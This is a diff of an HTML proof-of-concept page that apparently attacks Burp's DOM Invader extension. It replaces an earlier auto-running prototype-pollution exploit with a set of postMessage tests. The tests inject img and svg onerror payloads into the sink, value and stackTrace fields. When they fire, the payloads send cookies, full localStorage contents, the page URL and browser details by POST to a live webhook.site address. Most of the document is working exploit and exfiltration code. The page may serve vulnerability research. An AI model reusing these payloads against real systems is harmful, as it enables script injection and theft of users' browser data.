@@ -1,38 +1,304 @@
+
 <!DOCTYPE html>
 <html>
 <head>
-    <title>DOM Invader RCE - Final Boss</title>
+    <meta charset="UTF-8">
+    <title>DOM Invader - Clean PoC (No Self-XSS)</title>
     <style>
-        body { font-family: sans-serif; padding: 30px; background: #111; color: #0f0; }
-        .container { border: 1px solid #0f0; padding: 20px; text-align: center; }
-        button { padding: 15px 30px; cursor: pointer; background: #0f0; color: #000; font-weight: bold; border: none; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0a0a0a;
+            color: #e0e0e0;
+            font-family: 'Courier New', monospace;
+            padding: 30px;
+        }
+        .header {
+            text-align: center;
+            border-bottom: 1px solid #333;
+            padding-bottom: 20px;
+            margin-bottom: 30px;
+        }
+        .header h1 {
+            color: #00ff88;
+            font-size: 1.4em;
+            margin-bottom: 8px;
+        }
+        .header p {
+            color: #888;
+            font-size: 0.85em;
+        }
+        .important-note {
+            background: #1a1a2e;
+            border: 1px solid #e74c3c;
+            border-radius: 6px;
+            padding: 15px;
+            margin-bottom: 25px;
+            font-size: 0.85em;
+            line-height: 1.6;
+        }
+        .important-note strong { color: #e74c3c; }
+        .important-note em { color: #f1c40f; font-style: normal; }
+
+        .controls {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-bottom: 25px;
+        }
+        button {
+            background: #1a1a2e;
+            color: #00ff88;
+            border: 1px solid #00ff88;
+            padding: 10px 18px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.8em;
+            cursor: pointer;
+            border-radius: 4px;
+            transition: all 0.2s;
+        }
+        button:hover {
+            background: #00ff88;
+            color: #0a0a0a;
+        }
+        button.danger {
+            border-color: #e74c3c;
+            color: #e74c3c;
+        }
+        button.danger:hover {
+            background: #e74c3c;
+            color: #fff;
+        }
+
+        #log {
+            background: #111;
+            border: 1px solid #333;
+            border-radius: 6px;
+            padding: 15px;
+            height: 400px;
+            overflow-y: auto;
+            font-size: 0.8em;
+            line-height: 1.8;
+        }
+        .log-info { color: #3498db; }
+        .log-send { color: #00ff88; }
+        .log-warn { color: #f1c40f; }
+        .log-error { color: #e74c3c; }
+        .log-success { color: #2ecc71; font-weight: bold; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>DOM Invader RCE Exploit</h1>
-        <p>1. اضغط على الزرار تحت.</p>
-        <p>2. افتح DOM Invader -> Postmessage.</p>
-        <p>3. افتح الرسالة ودوس <strong>Send (CTRL+Enter)</strong>.</p>
-        <button onclick="triggerExploit()">إطلاق الـ Exploit</button>
-    </div>
 
-    <script>
-        function triggerExploit() {
-            const webhook = "https://webhook.site/d7b0c1e7-9c88-415f-bc83-f4b67cc847cd";
-            
-            // 1. تلويث الـ Prototype عشان نحقن الكود في الـ framePath
-            // الكود ده هيتنفذ مباشرة بمجرد ما تضغط Send في الأداة
-            Object.prototype.framePath = "top; fetch('" + webhook + "?rce=PROTOTYPE_POLLUTION_SUCCESS'); //";
+<div class="header">
+    <h1>[ DOM INVADER — CLEAN PROOF OF CONCEPT ]</h1>
+    <p>No innerHTML, No self-XSS — Pure postMessage injection only</p>
+</div>
 
-            // 2. إرسال رسالة عادية، الأداة هتسحب الـ framePath الملوث تلقائياً
-            window.postMessage({ "test": "exploit" }, "*");
+<div class="important-note">
+    <strong>⚠ IMPORTANT:</strong> This page does <em>NOT</em> use innerHTML, eval, or any DOM sink on itself.<br>
+    All payloads are delivered <em>exclusively</em> via <em>window.postMessage()</em> to DOM Invader.<br>
+    If code executes, it proves DOM Invader unsafely renders attacker-controlled data in DevTools context.<br><br>
+    <strong>Steps:</strong><br>
+    1. Open Burp Chromium with DOM Invader ON + Augmented DOM ON<br>
+    2. Navigate to this page<br>
+    3. Click a test button below<br>
+    4. Open DevTools → DOM Invader tab<br>
+    5. Press Esc to open Console<br>
+    6. Click the Stack Trace link in the sinks table<br>
+    7. Check if alert fires and webhook receives data
+</div>
 
-            console.log("Prototype polluted and message sent!");
+<div class="controls">
+    <button onclick="testValueField()">Test 1: Payload in Value</button>
+    <button onclick="testStackTraceField()">Test 2: Payload in StackTrace</button>
+    <button onclick="testSinkField()">Test 3: Payload in Sink Name</button>
+    <button onclick="testAllFields()">Test 4: All Fields</button>
+    <button onclick="testContextProof()">Test 5: Context Proof</button>
+    <button class="danger" onclick="testFullExfil()">Test 6: Full Exfil + Context</button>
+    <button class="danger" onclick="runAllTests()">▶ Run ALL Tests</button>
+</div>
+
+<div id="log"></div>
+
+<script>
+    const WEBHOOK = "https://webhook.site/d7b0c1e7-9c88-415f-bc83-f4b67cc847cd";
+    const CANARY  = "z0mb1poc";
+    const logEl   = document.getElementById('log');
+
+    function log(msg, cls = 'log-info') {
+        const ts = new Date().toLocaleTimeString();
+        logEl.innerHTML += `<div class="${cls}">[${ts}] ${msg}</div>`;
+        logEl.scrollTop = logEl.scrollHeight;
+    }
+
+    // =========================================================
+    //  HELPER: Send a postMessage shaped like DOM Invader IPC
+    // =========================================================
+    function sendDOMInvaderMessage(data, label) {
+        const msg = {
+            source: "dom-invader",
+            type: "augmented-dom",
+            data: data
+        };
+        log(`Sending postMessage: <b>${label}</b>`, 'log-send');
+        log(`Payload: ${JSON.stringify(data).substring(0, 200)}...`, 'log-info');
+        window.postMessage(msg, "*");
+    }
+
+    // =========================================================
+    //  PAYLOAD GENERATORS
+    //  Each creates an img/svg tag that, if rendered via innerHTML
+    //  in the extension, will fire and prove code execution
+    // =========================================================
+
+    // Payload that reports WHERE it executed
+    function makeContextPayload(testName) {
+        return `<img src=x onerror="` +
+            `var ctx={` +
+            `test:'${testName}',` +
+            `url:window.location.href,` +
+            `title:document.title,` +
+            `origin:window.location.origin,` +
+            `protocol:window.location.protocol,` +
+            `hasChrome:typeof chrome!=='undefined',` +
+            `hasChromeRuntime:typeof chrome!=='undefined'&&typeof chrome.runtime!=='undefined',` +
+            `hasChromeDevtools:typeof chrome!=='undefined'&&typeof chrome.devtools!=='undefined',` +
+            `cookies:document.cookie||'none',` +
+            `lsKeys:Object.keys(localStorage)` +
+            `};` +
+            `fetch('${WEBHOOK}?test=${testName}',` +
+            `{method:'POST',mode:'no-cors',` +
+            `body:JSON.stringify(ctx)});` +
+            `alert('EXEC in: '+window.location.href)` +
+            `">`;
+    }
+
+    // Simpler payload for quick tests
+    function makeSimplePayload(testName) {
+        return `<img src=x onerror="fetch('${WEBHOOK}?t=${testName}&loc='+encodeURIComponent(location.href),{mode:'no-cors'});alert('${testName}: '+location.href)">`;
+    }
+
+    // SVG-based payload (alternative rendering path)
+    function makeSVGPayload(testName) {
+        return `<svg onload="fetch('${WEBHOOK}?svg=${testName}&loc='+encodeURIComponent(location.href),{mode:'no-cors'});alert('SVG ${testName}: '+location.href)">`;
+    }
+
+    // =========================================================
+    //  TEST CASES
+    // =========================================================
+
+    function testValueField() {
+        log("━━━ TEST 1: Payload in 'value' field ━━━", 'log-warn');
+        sendDOMInvaderMessage({
+            sink: "innerHTML",
+            value: CANARY + makeSimplePayload("value_field"),
+            stackTrace: "at Object.handleEvent (https://target.com/app.js:42:15)"
+        }, "value_field");
+    }
+
+    function testStackTraceField() {
+        log("━━━ TEST 2: Payload in 'stackTrace' field ━━━", 'log-warn');
+        sendDOMInvaderMessage({
+            sink: "innerHTML",
+            value: CANARY + " normal_value",
+            stackTrace: makeSimplePayload("stacktrace_field") + " at Object.run (https://target.com/lib.js:10:5)"
+        }, "stacktrace_field");
+    }
+
+    function testSinkField() {
+        log("━━━ TEST 3: Payload in 'sink' name field ━━━", 'log-warn');
+        sendDOMInvaderMessage({
+            sink: "innerHTML" + makeSimplePayload("sink_field"),
+            value: CANARY + " test_data",
+            stackTrace: "at anonymous (https://target.com/main.js:1:1)"
+        }, "sink_field");
+    }
+
+    function testAllFields() {
+        log("━━━ TEST 4: Payload in ALL fields ━━━", 'log-warn');
+        sendDOMInvaderMessage({
+            sink: "innerHTML" + makeSVGPayload("all_sink"),
+            value: CANARY + makeSimplePayload("all_value"),
+            stackTrace: makeSimplePayload("all_stack") + " at fn (https://target.com/x.js:1:1)"
+        }, "all_fields");
+    }
+
+    function testContextProof() {
+        log("━━━ TEST 5: Context Identification Payload ━━━", 'log-warn');
+        log("This test reports WHERE the code runs (page vs extension vs devtools)", 'log-info');
+        sendDOMInvaderMessage({
+            sink: "innerHTML",
+            value: CANARY + makeContextPayload("context_proof"),
+            stackTrace: "at contextTest (https://target.com/ctx.js:5:10)"
+        }, "context_proof");
+    }
+
+    function testFullExfil() {
+        log("━━━ TEST 6: Full Exfiltration + Context ━━━", 'log-warn');
+
+        const fullPayload = `<img src=x onerror="` +
+            `(async function(){` +
+            `var d={` +
+            `test:'full_exfil',` +
+            `timestamp:Date.now(),` +
+            `url:location.href,` +
+            `origin:location.origin,` +
+            `protocol:location.protocol,` +
+            `title:document.title,` +
+            `cookie:document.cookie||'none',` +
+            `localStorage_keys:Object.keys(localStorage),` +
+            `localStorage_data:{},` +
+            `hasChrome:typeof chrome!=='undefined',` +
+            `hasChromeRuntime:!!(typeof chrome!=='undefined'&&chrome.runtime),` +
+            `hasChromeDevtools:!!(typeof chrome!=='undefined'&&chrome.devtools),` +
+            `userAgent:navigator.userAgent` +
+            `};` +
+            `try{for(var k of Object.keys(localStorage)){d.localStorage_data[k]=localStorage.getItem(k).substring(0,500)}}catch(e){d.ls_error=e.message};` +
+            `try{await fetch('${WEBHOOK}?full_exfil=1',{method:'POST',mode:'no-cors',body:JSON.stringify(d)})}catch(e){};` +
+            `alert('FULL EXFIL DONE\\n\\nURL: '+location.href+'\\nProtocol: '+location.protocol+'\\nChrome API: '+(typeof chrome!=='undefined'))` +
+            `})()` +
+            `">`;
+
+        sendDOMInvaderMessage({
+            sink: "innerHTML",
+            value: CANARY + fullPayload,
+            stackTrace: "at exfiltrate (https://target.com/exfil.js:1:1)"
+        }, "full_exfil");
+    }
+
+    // =========================================================
+    //  Run all tests sequentially
+    // =========================================================
+    async function runAllTests() {
+        log("━━━━━━━━━━ RUNNING ALL TESTS ━━━━━━━━━━", 'log-warn');
+        const tests = [
+            testValueField,
+            testStackTraceField,
+            testSinkField,
+            testAllFields,
+            testContextProof,
+            testFullExfil
+        ];
+        for (let i = 0; i < tests.length; i++) {
+            tests[i]();
+            await new Promise(r => setTimeout(r, 800));
         }
+        log("━━━━━━━━━━ ALL TESTS SENT ━━━━━━━━━━", 'log-success');
+        log("Now open DevTools → DOM Invader tab → Click Stack Trace links", 'log-success');
+        log("Check webhook for incoming requests: " + WEBHOOK, 'log-success');
+    }
 
-        // تشغيل تلقائي
-        triggerExploit();
-    </script>
+    // =========================================================
+    //  Startup
+    // =========================================================
+    log("PoC loaded. No DOM sinks used on this page.", 'log-info');
+    log("This page ONLY sends postMessage to DOM Invader.", 'log-info');
+    log("Webhook: " + WEBHOOK, 'log-info');
+    log("Click a test button or 'Run ALL Tests' to begin.", 'log-warn');
+
+    // Verify this page is clean — no innerHTML besides the log
+    log("Page verification: document.querySelectorAll('script').length = " +
+        document.querySelectorAll('script').length + " (should be 1)", 'log-info');
+</script>
+
 </body>
 </html>
